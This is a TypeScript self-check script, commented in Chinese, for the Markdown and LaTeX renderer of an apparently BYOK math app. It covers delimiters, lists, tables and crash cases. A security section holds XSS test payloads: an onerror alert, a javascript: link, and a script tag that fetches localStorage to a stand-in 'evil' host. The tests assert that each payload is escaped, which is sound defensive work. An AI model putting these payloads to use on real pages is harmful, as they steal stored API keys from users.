/**
 * 渲染自检。
 *
 * 覆盖面是「模型实际会写出来的东西」:Markdown 标记、各种形态的公式定界符、
 * 以及**恶意输出**。中间那条不是洁癖 —— 这是个 BYOK 应用,API Key 就在 localStorage 里,
 * 模型输出是不可信输入,渲染层必须从构造上就注入不了东西。
 *
 * 用 renderToStaticMarkup 在 node 里跑,不需要浏览器。
 * 运行:npm run check:render
 */
import { renderToStaticMarkup } from 'react-dom/server';
import { Markdown, MathBlock } from '../src/renderers/Markdown';
import { unwrap } from '../src/renderers/Latex';

let pass = 0;
let fail = 0;

function ok(name: string, cond: boolean, detail = '') {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

const md = (s: string) => renderToStaticMarkup(Markdown({ source: s }));

console.log('\n公式定界符 —— 这次报的 bug 就在这里');
for (const [input, label] of [
  [String.raw`\lim_{x\to 0}\sin\frac{1}{x}`, '裸 LaTeX'],
  [String.raw`$\lim_{x\to 0}\sin\frac{1}{x}$`, '$...$ 包裹'],
  [String.raw`$$\lim_{x\to 0}\sin\frac{1}{x}$$`, '$$...$$ 包裹'],
  [String.raw`\[\lim_{x\to 0}\sin\frac{1}{x}\]`, '\\[...\\] 包裹'],
  [String.raw`\(\lim_{x\to 0}\sin\frac{1}{x}\)`, '\\(...\\) 包裹'],
] as [string, string][]) {
  const got = unwrap(input);
  ok(`${label} 被剥成裸 LaTeX`, got === String.raw`\lim_{x\to 0}\sin\frac{1}{x}`, JSON.stringify(got));
}

ok('不该过度剥:只有一个 $ 时不处理', unwrap('$x') === '$x', unwrap('$x'));
ok('不该过度剥:普通公式原样返回', unwrap('x^2') === 'x^2');

console.log('\nMarkdown 块级');
ok('标题', md('## 等价性').includes('md-head-2'), md('## 等价性'));
ok('无序列表', (() => {
  const h = md('- 第一\n- 第二');
  return h.includes('<ul>') && h.match(/<li>/g)?.length === 2;
})(), md('- 第一\n- 第二'));
ok('有序列表', md('1. 第一\n2. 第二').includes('<ol>'), md('1. 第一\n2. 第二'));
ok('代码块', md('```\nf(x) = x^2\n```').includes('md-pre'), md('```\nf(x)\n```'));
ok('引用', md('> 注意边界情况').includes('<blockquote>'), md('> 注意'));
ok('分隔线', md('---').includes('<hr/>'), md('---'));
ok('负数不会被当成列表', !md('-1 是下界').includes('<ul>'), md('-1 是下界'));

console.log('\nMarkdown 行内 —— 「双星号没变粗」');
ok('**加粗**', md('这是**重点**').includes('<strong>重点</strong>'), md('这是**重点**'));
ok('__加粗__', md('这是__重点__').includes('<strong>重点</strong>'), md('这是__重点__'));
ok('*斜体*', md('这是*强调*').includes('<em>强调</em>'), md('这是*强调*'));
ok('行内代码', md('用 `plot2d` 画').includes('md-code'), md('用 `plot2d` 画'));
ok('加粗里套代码', md('**用 `x` 表示**').includes('<strong>') && md('**用 `x` 表示**').includes('md-code'));
ok('加粗和公式混排', (() => {
  const h = md('**关键**：$x^2$');
  return h.includes('<strong>关键</strong>') && h.includes('latex-inline');
})(), md('**关键**：$x^2$'));

console.log('\n恶意输出 —— BYOK 下模型输出是不可信输入');
{
  const h = md('<img src=x onerror="alert(1)">');
  ok('HTML 标签被转义,不成为元素', !h.includes('<img'), h);
}
{
  const h = md('<script>fetch("//evil/"+localStorage.mathesis)</script>');
  ok('script 标签被转义', !h.includes('<script'), h);
}
{
  const h = md('[点我](javascript:alert(1))');
  ok('javascript: 链接不生成 <a>', !h.includes('<a '), h);
}
{
  const h = md('[维基](https://zh.wikipedia.org/wiki/极限)');
  ok('https 链接正常生成', h.includes('<a ') && h.includes('rel="noreferrer noopener"'), h);
}
{
  const h = md(String.raw`$\href{javascript:alert(1)}{x}$`);
  // KaTeX 的 trust:false 会砍掉 \href 的 URL,只留文本
  ok('KaTeX 的 \\href 受 trust:false 限制', !h.includes('javascript:'), h);
}

console.log('\n命题 / 前提的渲染路由 —— 第二次报的 bug 在这里');
// 注:Latex 的实际 DOM 注入在 useEffect 里,SSR 不执行,所以这里断言的是
// 「路由到公式渲染且 KaTeX 解析成功」—— 后者由 latex-fallback 是否出现来判定
// (useMemo 在 SSR 里是会跑的)。
const rendered = (tex: string) => renderToStaticMarkup(MathBlock({ tex }));

for (const [name, input] of [
  ['含 \\text{中文} 的命题', String.raw`\lim_{x\to 0}\sin\frac{1}{x}\ \text{不存在}`],
  ['中英混排的 given', String.raw`f(x)=\sin(1/x)\ \text{在}\ x=0\ \text{的去心邻域上有定义}`],
  ['带集合符号的 given', String.raw`\mathbb{R}\setminus\{0\}`],
  ['纯中文说明', '证明 sin(1/x) 在 0 处没有极限'],
] as [string, string][]) {
  const h = rendered(input);
  ok(`${name} 走公式渲染且解析成功`, h.includes('latex-display') && !h.includes('latex-fallback'), h);
}

{
  const h = rendered('设 $f$ 在 $x_0$ 处连续');
  ok('夹着 $ 的说明文字走混排渲染', h.includes('latex-inline') && !h.includes('latex-fallback'), h);
}
{
  const h = rendered(String.raw`$\lim_{x\to 0}\sin\frac{1}{x}$`);
  ok('整体被 $ 包住时也不会退化成原始文本', !h.includes('latex-fallback') && !h.includes('\\lim'), h);
}

console.log('\n不崩');
for (const [name, input] of [
  ['空字符串', ''],
  ['纯空白', '   \n\n  '],
  ['未闭合的公式', '计算 $x^2'],
  ['未闭合的代码块', '```\n没关'],
  ['未闭合的加粗', '这是**没关'],
  ['只有标记', '****'],
  ['嵌套列表', '- 外层\n  - 内层'],
  ['公式里带换行', '$$\\begin{aligned}\na &= b\n\\end{aligned}$$'],
] as [string, string][]) {
  ok(name, (() => {
    try {
      md(input);
      return true;
    } catch {
      return false;
    }
  })());
}

console.log('\nMarkdown 表格');

{
  const h = md('| 甲 | 乙 |\n|---|---|\n| 1 | 2 |');
  ok('基本表格能渲染', h.includes('<table') && h.includes('<th'), h);
  ok('表头和数据行都在', h.includes('<thead') && h.includes('<tbody'), h);
  ok('单元格内容对', h.includes('甲') && h.includes('乙') && h.includes('1'), h);
  ok('不会再吐出裸的管道符', !h.includes('|---'), h);
}

{
  // 首尾管道符可省略(GitHub 风格两种都接受)
  const h = md('甲 | 乙\n--- | ---\n1 | 2');
  ok('省略首尾管道符也认', h.includes('<table'), h);
}

{
  const h = md('| 左 | 中 | 右 |\n|:---|:---:|---:|\n| a | b | c |');
  ok('对齐方式被解析', h.includes('text-align:left') && h.includes('text-align:center') && h.includes('text-align:right'), h);
}

{
  // 单元格里的行内公式和粗体照常工作
  const h = md('| 形式 | 含义 |\n|---|---|\n| $Ax = b$ | 系数表 |\n| **线性映射** | 本身 |');
  ok('单元格里的公式容器在', h.includes('latex-inline'), h);
  ok('单元格里的粗体在', h.includes('<strong>'), h);
}

{
  // 这一条最要紧:正文里的绝对值符号不能被当成表格。
  // 判据要求下一行是分隔行,所以 `|x|` 不会触发。
  const h = md('当 $|x| < \\delta$ 时\n\n以及 |x| 单独出现的时候');
  ok('正文里的 |x| 不被当成表格', !h.includes('<table'), h);
  ok('而且内容原样保留', h.includes('时'), h);
  ok('单独的 |x| 也不被当成表格', !md('这里 |x| 是绝对值').includes('<table'));
}

{
  // 表格后面接段落,段落不能被吞掉
  const h = md('| a | b |\n|---|---|\n| 1 | 2 |\n\n表格之后的段落。');
  ok('表格之后的段落仍在', h.includes('表格之后的段落'), h);
}

{
  // 表格前面有段落,段落要被正确截断
  const h = md('前面这句话。\n| a | b |\n|---|---|\n| 1 | 2 |');
  ok('表格之前的段落没被表格吞掉', h.includes('前面这句话'), h);
  ok('同时表格也渲染了', h.includes('<table'), h);
}

{
  // 残缺的行数(列数不齐)不能崩
  const ragged = md('| a | b | c |\n|---|---|---|\n| 1 |\n| 1 | 2 | 3 |');
  ok('列数不齐时不崩', ragged.includes('<table'), ragged);
}

{
  const h = md('| 单列 |\n|---|\n| 只有一个 |');
  ok('单列表格也能渲染', h.includes('<table'), h);
}

console.log(`\n${pass} 通过, ${fail} 失败\n`);
process.exit(fail ? 1 : 0);
